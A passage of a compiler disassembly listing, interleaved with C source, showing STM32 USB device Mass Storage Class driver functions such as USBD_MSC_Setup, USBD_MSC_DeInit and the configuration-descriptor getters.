 8008fd2:	4413      	add	r3, r2
 8008fd4:	009b      	lsls	r3, r3, #2
 8008fd6:	440b      	add	r3, r1
 8008fd8:	3324      	adds	r3, #36	; 0x24
 8008fda:	2201      	movs	r2, #1
 8008fdc:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008fde:	6878      	ldr	r0, [r7, #4]
 8008fe0:	f000 fa2c 	bl	800943c <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008fe4:	2300      	movs	r3, #0
}
 8008fe6:	4618      	mov	r0, r3
 8008fe8:	3710      	adds	r7, #16
 8008fea:	46bd      	mov	sp, r7
 8008fec:	bd80      	pop	{r7, pc}
 8008fee:	bf00      	nop
 8008ff0:	2000010b 	.word	0x2000010b
 8008ff4:	2000010a 	.word	0x2000010a

08008ff8 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008ff8:	b580      	push	{r7, lr}
 8008ffa:	b082      	sub	sp, #8
 8008ffc:	af00      	add	r7, sp, #0
 8008ffe:	6078      	str	r0, [r7, #4]
 8009000:	460b      	mov	r3, r1
 8009002:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8009004:	4b26      	ldr	r3, [pc, #152]	; (80090a0 <USBD_MSC_DeInit+0xa8>)
 8009006:	781b      	ldrb	r3, [r3, #0]
 8009008:	4619      	mov	r1, r3
 800900a:	6878      	ldr	r0, [r7, #4]
 800900c:	f003 fea2 	bl	800cd54 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8009010:	4b23      	ldr	r3, [pc, #140]	; (80090a0 <USBD_MSC_DeInit+0xa8>)
 8009012:	781b      	ldrb	r3, [r3, #0]
 8009014:	f003 020f 	and.w	r2, r3, #15
 8009018:	6879      	ldr	r1, [r7, #4]
 800901a:	4613      	mov	r3, r2
 800901c:	009b      	lsls	r3, r3, #2
 800901e:	4413      	add	r3, r2
 8009020:	009b      	lsls	r3, r3, #2
 8009022:	440b      	add	r3, r1
 8009024:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8009028:	2200      	movs	r2, #0
 800902a:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 800902c:	4b1d      	ldr	r3, [pc, #116]	; (80090a4 <USBD_MSC_DeInit+0xac>)
 800902e:	781b      	ldrb	r3, [r3, #0]
 8009030:	4619      	mov	r1, r3
 8009032:	6878      	ldr	r0, [r7, #4]
 8009034:	f003 fe8e 	bl	800cd54 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8009038:	4b1a      	ldr	r3, [pc, #104]	; (80090a4 <USBD_MSC_DeInit+0xac>)
 800903a:	781b      	ldrb	r3, [r3, #0]
 800903c:	f003 020f 	and.w	r2, r3, #15
 8009040:	6879      	ldr	r1, [r7, #4]
 8009042:	4613      	mov	r3, r2
 8009044:	009b      	lsls	r3, r3, #2
 8009046:	4413      	add	r3, r2
 8009048:	009b      	lsls	r3, r3, #2
 800904a:	440b      	add	r3, r1
 800904c:	3324      	adds	r3, #36	; 0x24
 800904e:	2200      	movs	r2, #0
 8009050:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8009052:	687b      	ldr	r3, [r7, #4]
 8009054:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009058:	687b      	ldr	r3, [r7, #4]
 800905a:	32b0      	adds	r2, #176	; 0xb0
 800905c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009060:	2b00      	cmp	r3, #0
 8009062:	d018      	beq.n	8009096 <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8009064:	6878      	ldr	r0, [r7, #4]
 8009066:	f000 fa6f 	bl	8009548 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 800906a:	687b      	ldr	r3, [r7, #4]
 800906c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009070:	687b      	ldr	r3, [r7, #4]
 8009072:	32b0      	adds	r2, #176	; 0xb0
 8009074:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009078:	4618      	mov	r0, r3
 800907a:	f004 f87d 	bl	800d178 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 800907e:	687b      	ldr	r3, [r7, #4]
 8009080:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009084:	687b      	ldr	r3, [r7, #4]
 8009086:	32b0      	adds	r2, #176	; 0xb0
 8009088:	2100      	movs	r1, #0
 800908a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 800908e:	687b      	ldr	r3, [r7, #4]
 8009090:	2200      	movs	r2, #0
 8009092:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8009096:	2300      	movs	r3, #0
}
 8009098:	4618      	mov	r0, r3
 800909a:	3708      	adds	r7, #8
 800909c:	46bd      	mov	sp, r7
 800909e:	bd80      	pop	{r7, pc}
 80090a0:	2000010b 	.word	0x2000010b
 80090a4:	2000010a 	.word	0x2000010a

080090a8 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 80090a8:	b580      	push	{r7, lr}
 80090aa:	b086      	sub	sp, #24
 80090ac:	af00      	add	r7, sp, #0
 80090ae:	6078      	str	r0, [r7, #4]
 80090b0:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80090b2:	687b      	ldr	r3, [r7, #4]
 80090b4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80090b8:	687b      	ldr	r3, [r7, #4]
 80090ba:	32b0      	adds	r2, #176	; 0xb0
 80090bc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80090c0:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 80090c2:	2300      	movs	r3, #0
 80090c4:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 80090c6:	2300      	movs	r3, #0
 80090c8:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80090ca:	693b      	ldr	r3, [r7, #16]
 80090cc:	2b00      	cmp	r3, #0
 80090ce:	d101      	bne.n	80090d4 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 80090d0:	2303      	movs	r3, #3
 80090d2:	e0e1      	b.n	8009298 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80090d4:	683b      	ldr	r3, [r7, #0]
 80090d6:	781b      	ldrb	r3, [r3, #0]
 80090d8:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80090dc:	2b00      	cmp	r3, #0
 80090de:	d053      	beq.n	8009188 <USBD_MSC_Setup+0xe0>
 80090e0:	2b20      	cmp	r3, #32
 80090e2:	f040 80d1 	bne.w	8009288 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80090e6:	683b      	ldr	r3, [r7, #0]
 80090e8:	785b      	ldrb	r3, [r3, #1]
 80090ea:	2bfe      	cmp	r3, #254	; 0xfe
 80090ec:	d002      	beq.n	80090f4 <USBD_MSC_Setup+0x4c>
 80090ee:	2bff      	cmp	r3, #255	; 0xff
 80090f0:	d02a      	beq.n	8009148 <USBD_MSC_Setup+0xa0>
 80090f2:	e041      	b.n	8009178 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 80090f4:	683b      	ldr	r3, [r7, #0]
 80090f6:	885b      	ldrh	r3, [r3, #2]
 80090f8:	2b00      	cmp	r3, #0
 80090fa:	d11e      	bne.n	800913a <USBD_MSC_Setup+0x92>
 80090fc:	683b      	ldr	r3, [r7, #0]
 80090fe:	88db      	ldrh	r3, [r3, #6]
 8009100:	2b01      	cmp	r3, #1
 8009102:	d11a      	bne.n	800913a <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8009104:	683b      	ldr	r3, [r7, #0]
 8009106:	781b      	ldrb	r3, [r3, #0]
 8009108:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 800910a:	2b00      	cmp	r3, #0
 800910c:	da15      	bge.n	800913a <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 800910e:	687b      	ldr	r3, [r7, #4]
 8009110:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009114:	687a      	ldr	r2, [r7, #4]
 8009116:	33b0      	adds	r3, #176	; 0xb0
 8009118:	009b      	lsls	r3, r3, #2
 800911a:	4413      	add	r3, r2
 800911c:	685b      	ldr	r3, [r3, #4]
 800911e:	699b      	ldr	r3, [r3, #24]
 8009120:	4798      	blx	r3
 8009122:	4603      	mov	r3, r0
 8009124:	461a      	mov	r2, r3
 8009126:	693b      	ldr	r3, [r7, #16]
 8009128:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 800912a:	693b      	ldr	r3, [r7, #16]
 800912c:	2201      	movs	r2, #1
 800912e:	4619      	mov	r1, r3
 8009130:	6878      	ldr	r0, [r7, #4]
 8009132:	f003 f979 	bl	800c428 <USBD_CtlSendData>
 8009136:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009138:	e025      	b.n	8009186 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 800913a:	6839      	ldr	r1, [r7, #0]
 800913c:	6878      	ldr	r0, [r7, #4]
 800913e:	f003 f902 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 8009142:	2303      	movs	r3, #3
 8009144:	75fb      	strb	r3, [r7, #23]
          break;
 8009146:	e01e      	b.n	8009186 <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8009148:	683b      	ldr	r3, [r7, #0]
 800914a:	885b      	ldrh	r3, [r3, #2]
 800914c:	2b00      	cmp	r3, #0
 800914e:	d10c      	bne.n	800916a <USBD_MSC_Setup+0xc2>
 8009150:	683b      	ldr	r3, [r7, #0]
 8009152:	88db      	ldrh	r3, [r3, #6]
 8009154:	2b00      	cmp	r3, #0
 8009156:	d108      	bne.n	800916a <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8009158:	683b      	ldr	r3, [r7, #0]
 800915a:	781b      	ldrb	r3, [r3, #0]
 800915c:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 800915e:	2b00      	cmp	r3, #0
 8009160:	db03      	blt.n	800916a <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8009162:	6878      	ldr	r0, [r7, #4]
 8009164:	f000 f9bc 	bl	80094e0 <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009168:	e00d      	b.n	8009186 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 800916a:	6839      	ldr	r1, [r7, #0]
 800916c:	6878      	ldr	r0, [r7, #4]
 800916e:	f003 f8ea 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 8009172:	2303      	movs	r3, #3
 8009174:	75fb      	strb	r3, [r7, #23]
          break;
 8009176:	e006      	b.n	8009186 <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8009178:	6839      	ldr	r1, [r7, #0]
 800917a:	6878      	ldr	r0, [r7, #4]
 800917c:	f003 f8e3 	bl	800c346 <USBD_CtlError>
          ret = USBD_FAIL;
 8009180:	2303      	movs	r3, #3
 8009182:	75fb      	strb	r3, [r7, #23]
          break;
 8009184:	bf00      	nop
      }
      break;
 8009186:	e086      	b.n	8009296 <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8009188:	683b      	ldr	r3, [r7, #0]
 800918a:	785b      	ldrb	r3, [r3, #1]
 800918c:	2b0b      	cmp	r3, #11
 800918e:	d872      	bhi.n	8009276 <USBD_MSC_Setup+0x1ce>
 8009190:	a201      	add	r2, pc, #4	; (adr r2, 8009198 <USBD_MSC_Setup+0xf0>)
 8009192:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009196:	bf00      	nop
 8009198:	080091c9 	.word	0x080091c9
 800919c:	08009245 	.word	0x08009245
 80091a0:	08009277 	.word	0x08009277
 80091a4:	08009277 	.word	0x08009277
 80091a8:	08009277 	.word	0x08009277
 80091ac:	08009277 	.word	0x08009277
 80091b0:	08009277 	.word	0x08009277
 80091b4:	08009277 	.word	0x08009277
 80091b8:	08009277 	.word	0x08009277
 80091bc:	08009277 	.word	0x08009277
 80091c0:	080091f3 	.word	0x080091f3
 80091c4:	0800921d 	.word	0x0800921d
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80091c8:	687b      	ldr	r3, [r7, #4]
 80091ca:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80091ce:	b2db      	uxtb	r3, r3
 80091d0:	2b03      	cmp	r3, #3
 80091d2:	d107      	bne.n	80091e4 <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 80091d4:	f107 030e 	add.w	r3, r7, #14
 80091d8:	2202      	movs	r2, #2
 80091da:	4619      	mov	r1, r3
 80091dc:	6878      	ldr	r0, [r7, #4]
 80091de:	f003 f923 	bl	800c428 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80091e2:	e050      	b.n	8009286 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80091e4:	6839      	ldr	r1, [r7, #0]
 80091e6:	6878      	ldr	r0, [r7, #4]
 80091e8:	f003 f8ad 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 80091ec:	2303      	movs	r3, #3
 80091ee:	75fb      	strb	r3, [r7, #23]
          break;
 80091f0:	e049      	b.n	8009286 <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80091f2:	687b      	ldr	r3, [r7, #4]
 80091f4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80091f8:	b2db      	uxtb	r3, r3
 80091fa:	2b03      	cmp	r3, #3
 80091fc:	d107      	bne.n	800920e <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 80091fe:	693b      	ldr	r3, [r7, #16]
 8009200:	3304      	adds	r3, #4
 8009202:	2201      	movs	r2, #1
 8009204:	4619      	mov	r1, r3
 8009206:	6878      	ldr	r0, [r7, #4]
 8009208:	f003 f90e 	bl	800c428 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800920c:	e03b      	b.n	8009286 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800920e:	6839      	ldr	r1, [r7, #0]
 8009210:	6878      	ldr	r0, [r7, #4]
 8009212:	f003 f898 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 8009216:	2303      	movs	r3, #3
 8009218:	75fb      	strb	r3, [r7, #23]
          break;
 800921a:	e034      	b.n	8009286 <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800921c:	687b      	ldr	r3, [r7, #4]
 800921e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009222:	b2db      	uxtb	r3, r3
 8009224:	2b03      	cmp	r3, #3
 8009226:	d106      	bne.n	8009236 <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 8009228:	683b      	ldr	r3, [r7, #0]
 800922a:	885b      	ldrh	r3, [r3, #2]
 800922c:	b2db      	uxtb	r3, r3
 800922e:	461a      	mov	r2, r3
 8009230:	693b      	ldr	r3, [r7, #16]
 8009232:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009234:	e027      	b.n	8009286 <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 8009236:	6839      	ldr	r1, [r7, #0]
 8009238:	6878      	ldr	r0, [r7, #4]
 800923a:	f003 f884 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 800923e:	2303      	movs	r3, #3
 8009240:	75fb      	strb	r3, [r7, #23]
          break;
 8009242:	e020      	b.n	8009286 <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009244:	687b      	ldr	r3, [r7, #4]
 8009246:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800924a:	b2db      	uxtb	r3, r3
 800924c:	2b03      	cmp	r3, #3
 800924e:	d119      	bne.n	8009284 <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 8009250:	683b      	ldr	r3, [r7, #0]
 8009252:	885b      	ldrh	r3, [r3, #2]
 8009254:	2b00      	cmp	r3, #0
 8009256:	d115      	bne.n	8009284 <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 8009258:	683b      	ldr	r3, [r7, #0]
 800925a:	889b      	ldrh	r3, [r3, #4]
 800925c:	b2db      	uxtb	r3, r3
 800925e:	4619      	mov	r1, r3
 8009260:	6878      	ldr	r0, [r7, #4]
 8009262:	f003 fdad 	bl	800cdc0 <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 8009266:	683b      	ldr	r3, [r7, #0]
 8009268:	889b      	ldrh	r3, [r3, #4]
 800926a:	b2db      	uxtb	r3, r3
 800926c:	4619      	mov	r1, r3
 800926e:	6878      	ldr	r0, [r7, #4]
 8009270:	f000 fb54 	bl	800991c <MSC_BOT_CplClrFeature>
            }
          }
          break;
 8009274:	e006      	b.n	8009284 <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 8009276:	6839      	ldr	r1, [r7, #0]
 8009278:	6878      	ldr	r0, [r7, #4]
 800927a:	f003 f864 	bl	800c346 <USBD_CtlError>
          ret = USBD_FAIL;
 800927e:	2303      	movs	r3, #3
 8009280:	75fb      	strb	r3, [r7, #23]
          break;
 8009282:	e000      	b.n	8009286 <USBD_MSC_Setup+0x1de>
          break;
 8009284:	bf00      	nop
      }
      break;
 8009286:	e006      	b.n	8009296 <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 8009288:	6839      	ldr	r1, [r7, #0]
 800928a:	6878      	ldr	r0, [r7, #4]
 800928c:	f003 f85b 	bl	800c346 <USBD_CtlError>
      ret = USBD_FAIL;
 8009290:	2303      	movs	r3, #3
 8009292:	75fb      	strb	r3, [r7, #23]
      break;
 8009294:	bf00      	nop
  }

  return (uint8_t)ret;
 8009296:	7dfb      	ldrb	r3, [r7, #23]
}
 8009298:	4618      	mov	r0, r3
 800929a:	3718      	adds	r7, #24
 800929c:	46bd      	mov	sp, r7
 800929e:	bd80      	pop	{r7, pc}

080092a0 <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80092a0:	b580      	push	{r7, lr}
 80092a2:	b082      	sub	sp, #8
 80092a4:	af00      	add	r7, sp, #0
 80092a6:	6078      	str	r0, [r7, #4]
 80092a8:	460b      	mov	r3, r1
 80092aa:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 80092ac:	78fb      	ldrb	r3, [r7, #3]
 80092ae:	4619      	mov	r1, r3
 80092b0:	6878      	ldr	r0, [r7, #4]
 80092b2:	f000 f961 	bl	8009578 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 80092b6:	2300      	movs	r3, #0
}
 80092b8:	4618      	mov	r0, r3
 80092ba:	3708      	adds	r7, #8
 80092bc:	46bd      	mov	sp, r7
 80092be:	bd80      	pop	{r7, pc}

080092c0 <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80092c0:	b580      	push	{r7, lr}
 80092c2:	b082      	sub	sp, #8
 80092c4:	af00      	add	r7, sp, #0
 80092c6:	6078      	str	r0, [r7, #4]
 80092c8:	460b      	mov	r3, r1
 80092ca:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 80092cc:	78fb      	ldrb	r3, [r7, #3]
 80092ce:	4619      	mov	r1, r3
 80092d0:	6878      	ldr	r0, [r7, #4]
 80092d2:	f000 f98d 	bl	80095f0 <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 80092d6:	2300      	movs	r3, #0
}
 80092d8:	4618      	mov	r0, r3
 80092da:	3708      	adds	r7, #8
 80092dc:	46bd      	mov	sp, r7
 80092de:	bd80      	pop	{r7, pc}

080092e0 <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 80092e0:	b580      	push	{r7, lr}
 80092e2:	b084      	sub	sp, #16
 80092e4:	af00      	add	r7, sp, #0
 80092e6:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80092e8:	2181      	movs	r1, #129	; 0x81
 80092ea:	4812      	ldr	r0, [pc, #72]	; (8009334 <USBD_MSC_GetHSCfgDesc+0x54>)
 80092ec:	f002 f9c8 	bl	800b680 <USBD_GetEpDesc>
 80092f0:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80092f2:	2101      	movs	r1, #1
 80092f4:	480f      	ldr	r0, [pc, #60]	; (8009334 <USBD_MSC_GetHSCfgDesc+0x54>)
 80092f6:	f002 f9c3 	bl	800b680 <USBD_GetEpDesc>
 80092fa:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80092fc:	68fb      	ldr	r3, [r7, #12]
 80092fe:	2b00      	cmp	r3, #0
 8009300:	d006      	beq.n	8009310 <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009302:	68fb      	ldr	r3, [r7, #12]
 8009304:	2200      	movs	r2, #0
 8009306:	711a      	strb	r2, [r3, #4]
 8009308:	2200      	movs	r2, #0
 800930a:	f042 0202 	orr.w	r2, r2, #2
 800930e:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009310:	68bb      	ldr	r3, [r7, #8]
 8009312:	2b00      	cmp	r3, #0
 8009314:	d006      	beq.n	8009324 <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 8009316:	68bb      	ldr	r3, [r7, #8]
 8009318:	2200      	movs	r2, #0
 800931a:	711a      	strb	r2, [r3, #4]
 800931c:	2200      	movs	r2, #0
 800931e:	f042 0202 	orr.w	r2, r2, #2
 8009322:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009324:	687b      	ldr	r3, [r7, #4]
 8009326:	2220      	movs	r2, #32
 8009328:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800932a:	4b02      	ldr	r3, [pc, #8]	; (8009334 <USBD_MSC_GetHSCfgDesc+0x54>)
}
 800932c:	4618      	mov	r0, r3
 800932e:	3710      	adds	r7, #16
 8009330:	46bd      	mov	sp, r7
 8009332:	bd80      	pop	{r7, pc}
 8009334:	200000e0 	.word	0x200000e0

08009338 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 8009338:	b580      	push	{r7, lr}
 800933a:	b084      	sub	sp, #16
 800933c:	af00      	add	r7, sp, #0
 800933e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009340:	2181      	movs	r1, #129	; 0x81
 8009342:	4812      	ldr	r0, [pc, #72]	; (800938c <USBD_MSC_GetFSCfgDesc+0x54>)
 8009344:	f002 f99c 	bl	800b680 <USBD_GetEpDesc>
 8009348:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800934a:	2101      	movs	r1, #1
 800934c:	480f      	ldr	r0, [pc, #60]	; (800938c <USBD_MSC_GetFSCfgDesc+0x54>)
 800934e:	f002 f997 	bl	800b680 <USBD_GetEpDesc>
 8009352:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009354:	68fb      	ldr	r3, [r7, #12]
 8009356:	2b00      	cmp	r3, #0
 8009358:	d006      	beq.n	8009368 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800935a:	68fb      	ldr	r3, [r7, #12]
 800935c:	2200      	movs	r2, #0
 800935e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009362:	711a      	strb	r2, [r3, #4]
 8009364:	2200      	movs	r2, #0
 8009366:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009368:	68bb      	ldr	r3, [r7, #8]
 800936a:	2b00      	cmp	r3, #0
 800936c:	d006      	beq.n	800937c <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800936e:	68bb      	ldr	r3, [r7, #8]
 8009370:	2200      	movs	r2, #0
 8009372:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009376:	711a      	strb	r2, [r3, #4]
 8009378:	2200      	movs	r2, #0
 800937a:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 800937c:	687b      	ldr	r3, [r7, #4]
 800937e:	2220      	movs	r2, #32
 8009380:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009382:	4b02      	ldr	r3, [pc, #8]	; (800938c <USBD_MSC_GetFSCfgDesc+0x54>)
}
 8009384:	4618      	mov	r0, r3
 8009386:	3710      	adds	r7, #16
 8009388:	46bd      	mov	sp, r7
 800938a:	bd80      	pop	{r7, pc}
 800938c:	200000e0 	.word	0x200000e0

08009390 <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8009390:	b580      	push	{r7, lr}
 8009392:	b084      	sub	sp, #16
 8009394:	af00      	add	r7, sp, #0
 8009396:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009398:	2181      	movs	r1, #129	; 0x81
 800939a:	4812      	ldr	r0, [pc, #72]	; (80093e4 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 800939c:	f002 f970 	bl	800b680 <USBD_GetEpDesc>
 80093a0:	60f8      	str	r0, [r7, #12]
